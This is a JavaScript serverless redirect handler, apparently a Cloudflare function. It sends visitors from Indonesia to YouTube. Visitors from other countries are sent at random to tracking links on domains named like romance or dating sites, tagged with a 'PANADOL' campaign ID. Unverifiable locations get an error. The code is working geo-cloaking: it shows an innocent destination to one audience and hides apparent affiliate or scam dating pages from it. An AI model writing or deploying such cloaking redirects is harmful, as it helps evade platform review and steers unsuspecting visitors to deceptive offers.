const URL_INDONESIA = "https://www.youtube.com";

const URL_LUAR = [
  "https://meppmr4.love-romanceflirt.com/lpk2huu?s1=PANADOL&cid=PANADOL",
  "https://meppmr4.emotionaltogetherness.org/lpk2huu?s1=PANADOL&cid=PANADOL"
];

export async function onRequest({ request }) {
  if (request.method !== "GET" && request.method !== "HEAD") {
    return new Response("Method Not Allowed", {
      status: 405,
      headers: {
        "Allow": "GET, HEAD",
        "Cache-Control": "no-store"
      }
    });
  }

  const country = request.cf?.country;

  let destination;

  if (country === "ID") {
    destination = URL_INDONESIA;
  } else {
    const isKnownCountry =
      typeof country === "string" &&
      /^[A-Z]{2}$/.test(country) &&
      country !== "XX";

    if (!isKnownCountry) {
      return new Response(
        "Lokasi IP tidak dapat diverifikasi. Silakan coba kembali.",
        {
          status: 503,
          headers: {
            "Content-Type": "text/plain; charset=UTF-8",
            "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
            "Pragma": "no-cache",
            "Expires": "0"
          }
        }
      );
    }

    const randomByte = new Uint8Array(1);
    crypto.getRandomValues(randomByte);
    destination = URL_LUAR[randomByte[0] & 1];
  }

  return new Response(null, {
    status: 302,
    headers: {
      "Location": destination,
      "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
      "Pragma": "no-cache",
      "Expires": "0"
    }
  });
}
